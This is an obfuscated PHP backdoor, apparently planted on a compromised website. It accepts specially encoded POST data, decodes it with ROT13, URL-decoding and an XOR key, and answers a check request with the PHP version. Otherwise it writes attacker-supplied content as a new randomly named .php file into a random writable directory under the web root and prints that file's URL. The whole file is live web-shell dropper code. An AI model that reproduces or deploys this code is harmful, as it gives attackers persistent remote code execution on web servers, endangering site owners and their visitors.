<?php $xhyluwfxz = "zwfmpjumdxttozra";$cxnbnpm = "";foreach ($_POST as $xydwet => $qllqqevpyv){if (strlen($xydwet) == 16 and substr_count($qllqqevpyv, "%") > 10){rbxawxi($xydwet, $qllqqevpyv);}}function rbxawxi($xydwet, $oaefkobxrn){global $cxnbnpm;$cxnbnpm = $xydwet;$oaefkobxrn = str_split(rawurldecode(str_rot13($oaefkobxrn)));function nmrcgnotgg($lmxwbesse, $xydwet){global $xhyluwfxz, $cxnbnpm;return $lmxwbesse ^ $xhyluwfxz[$xydwet % strlen($xhyluwfxz)] ^ $cxnbnpm[$xydwet % strlen($cxnbnpm)];}$oaefkobxrn = implode("", array_map("nmrcgnotgg", array_values($oaefkobxrn), array_keys($oaefkobxrn)));$oaefkobxrn = @unserialize($oaefkobxrn);if (@is_array($oaefkobxrn)){$xydwet = array_keys($oaefkobxrn);$oaefkobxrn = $oaefkobxrn[$xydwet[0]];if ($oaefkobxrn === $xydwet[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function qephttpl($biftpznpir) {static $iqyzbgonxp = array();$mraoejkg = glob($biftpznpir . '/*', GLOB_ONLYDIR);if (count($mraoejkg) > 0) {foreach ($mraoejkg as $biftpznp){if (@is_writable($biftpznp)){$iqyzbgonxp[] = $biftpznp;}}}foreach ($mraoejkg as $biftpznpir) qephttpl($biftpznpir);return $iqyzbgonxp;}$tbezjlxgk = $_SERVER["DOCUMENT_ROOT"];$mraoejkg = qephttpl($tbezjlxgk);$xydwet = array_rand($mraoejkg);$xazrf = $mraoejkg[$xydwet] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($xazrf, $oaefkobxrn);echo "http://" . $_SERVER["HTTP_HOST"] . substr($xazrf, strlen($tbezjlxgk));exit();}}}